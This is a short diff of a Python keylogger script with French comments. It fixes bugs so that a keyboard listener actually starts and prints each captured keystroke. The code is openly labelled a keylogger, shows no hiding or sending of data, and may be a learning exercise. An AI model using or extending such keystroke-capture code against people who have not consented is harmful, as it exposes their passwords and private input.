@@ -43,7 +43,7 @@ def onpress(key):
         buffer.append(key_str) #pour eviter les donner corrompues
     if len(buffer) >= BUFFER_SIZE:
         flush_buffer()
-        print("[{timestamp}] Capturé : {key_str}")
+        print(f"[{timestamp}] Capturé : {key_str}")
 def on_release(key):
     if key == keyboard.Key.esc:
         print("\n[*] Touche ESC détectée — arrêt du listener.")
@@ -67,10 +67,11 @@ class KeyLogger:
         self.is_running = True
 
         self.listener = keyboard.Listener(
-            on_press=on_press,
+            on_press=onpress,
             on_release=on_release
         )
 
+        self.listener.start()
         self.listener.join()
 
         self.is_running = False
